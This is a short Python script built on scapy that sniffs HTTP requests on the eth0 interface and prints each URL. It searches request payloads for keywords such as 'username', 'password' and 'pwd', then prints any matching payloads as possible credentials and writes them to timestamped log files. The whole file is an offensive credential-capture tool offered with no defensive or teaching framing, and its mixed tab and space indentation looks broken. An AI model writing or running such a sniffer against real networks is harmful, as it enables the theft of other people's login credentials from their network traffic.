#!/usr/bin/python
import scapy.all as scapy
from scapy_http import http
from colorama import Fore,Back,Style
from datetime import datetime


def FileName():
	return  datetime.strftime(datetime.now(),'%Y-%m-%d-%H-%M-%S')

def Sniff(interface):
	scapy.sniff(iface=interface,store=False,prn=Prosess_sniffed_paceket)

def Geturl(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def Get_login_info(packet):
    if packet.haslayer(scapy.Raw):
    	load = packet[scapy.Raw].load
	keywords = ["username","user","login","password","pass","email","name","id","pPASS","Username","user_login","login_username","log","pwd"]
	for keyword in keywords:
	    if keyword in load:
		return load
				

def Prosess_sniffed_paceket(packet):
	if packet.haslayer(http.HTTPRequest):
		website = Geturl(packet)
		print(Fore.BLUE + "[+] HTTP Request >>" + str(website))
	 	loginfo = Get_login_info(packet)
	 	if loginfo:
	 		print(Fore.RED + "\n\n\t [!] Possible Username/password >> " + loginfo + "\n\n\n")
	 		file = open('data/log_' + FileName() + '.txt' ,'w+')
	 		file.write(website + "\n\n\t" +loginfo)

Sniff("eth0")


